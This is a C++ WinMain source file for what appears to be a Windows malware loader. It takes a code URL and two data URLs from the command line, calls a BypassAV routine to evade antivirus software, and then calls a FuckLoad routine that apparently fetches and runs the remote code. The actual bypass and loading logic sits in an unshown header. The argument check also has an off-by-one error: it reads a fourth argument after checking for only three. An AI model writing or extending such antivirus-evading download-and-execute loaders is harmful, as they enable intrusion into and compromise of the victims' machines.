#include "stdafx.h"

#include <windows.h>
#include <shellapi.h>

#include "CFuck.h"

#pragma comment(lib,"Shell32.lib")


#ifdef _DEBUG
#define print printf
#else
#define print
#endif


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
#ifdef _DEBUG
	AllocConsole();
	freopen("CONIN$", "r+", stdin);
	freopen("CONOUT$", "w+", stdout);
	freopen("CONOUT$", "w+", stderr);
#endif

	//
	// 验证参数
	//
	LPWSTR* szArglist;
	int nArgs;
	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist)
	{
		print("[-] CommandLineToArgvW failed\n");
		return 0;
	}
	else
	{
		for (int i = 0; i < nArgs; i++)
		{
			print("[+] Arg%d: %ws\n", i, szArglist[i]);
		}
		if (nArgs < 3)
			return 0;

		// 有3个参数以上
		wchar_t* pCodeUrl = szArglist[1];
		wchar_t* pDataUrl1 = szArglist[2];
		wchar_t* pDataUrl2 = szArglist[3];
		if (CFuck::GetInstance()->BypassAV())
		{
			CFuck::GetInstance()->FuckLoad(pCodeUrl, pDataUrl1, pDataUrl2);
		}
	}
#ifdef _DEBUG
	system("pause");
	FreeConsole();
#endif
	return 0;
}